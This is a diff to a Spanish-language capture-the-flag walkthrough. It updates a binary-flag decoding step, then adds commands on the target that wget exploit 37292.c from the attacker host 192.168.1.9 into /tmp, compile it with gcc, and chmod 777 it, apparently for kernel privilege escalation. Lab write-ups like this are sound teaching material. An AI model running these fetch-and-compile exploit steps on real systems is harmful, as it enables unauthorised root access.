@@ -85,7 +85,7 @@ Flag ofuscada en código binario: `01100111 01101111 01101111 01100100 00100000 
 
 - *Paso 6:* Decodificar binario.
 
-ONLINE: `https://www.online-toolz.com/langs/es/tool-es-text-binary-convertor.html`
+ONLINE: https://www.online-toolz.com/langs/es/tool-es-text-binary-convertor.html
 
 ![10](https://user-images.githubusercontent.com/75953873/174459040-d0e1d032-167b-464b-a9c4-d3aa8d57753d.png)
 
@@ -114,9 +114,12 @@ python3 -m http.server 80
 ```
 ![14](https://user-images.githubusercontent.com/75953873/174459453-de8a70d0-36c7-4238-b8eb-bac90a4a891e.png)
 
-Descargar exploit en el directorio `/tmp`:
+Descargar exploit en el directorio `/tmp`; compilar y dar permisos de escritrura, lectura y ejecucción:
 ```
 cd /tmp
 wget http://192.168.1.9/37292.c
+gcc 37292.c -o kernel
+chmod 777 kernel
 ```
-![15](https://user-images.githubusercontent.com/75953873/174459492-8ced5d75-6852-4b39-a888-0a9216cf23e8.png)
+![15](https://user-images.githubusercontent.com/75953873/174459564-3b68a9b2-1d9f-4bcf-8689-a2f0afe3d4f5.png)
+
